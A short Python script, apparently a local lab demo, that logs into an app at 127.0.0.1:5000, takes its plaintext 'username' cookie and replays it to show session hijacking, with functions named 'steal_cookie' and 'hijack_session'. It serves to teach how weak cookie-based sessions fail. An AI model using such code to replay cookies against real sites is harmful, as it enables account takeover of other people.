import requests


# Simulate intercepted cookie
def steal_cookie(url, username, password):
    # Perform login to get the session cookie
    login_url = f"{url}/login"
    session = requests.Session()  # Use a session to persist cookies
    login_data = {
        'username': username,
        'password': password
    }

    # Send POST request to login
    response = session.post(login_url, data=login_data)

    # Check if login was successful
    if response.status_code == 200 and 'Welcome:' in response.text:
        print("Login successful!")
        print("All cookies received:", session.cookies)  # Print all cookies
        stolen_cookie = session.cookies.get('username')
        print(f'Stolen cookie: {stolen_cookie}')
        return stolen_cookie
    else:
        print("Login failed. Unable to steal cookie.")
        return None


# Use stolen cookie
def hijack_session(url, cookie):
    if cookie:
        cookies = {'username': cookie}
        response = requests.get(url, cookies=cookies)
        print(f'Hijacked content: {response.text}')
    else:
        print("No cookie to hijack the session.")


# Example usage
if __name__ == '__main__':
    target_url = 'http://127.0.0.1:5000/'
    username = 'admin'  # Replace with the actual username
    password = 'password'  # Replace with the actual password

    # Steal the cookie by logging in
    stolen = steal_cookie(target_url, username, password)

    # Hijack the session using the stolen cookie
    hijack_session(target_url, stolen)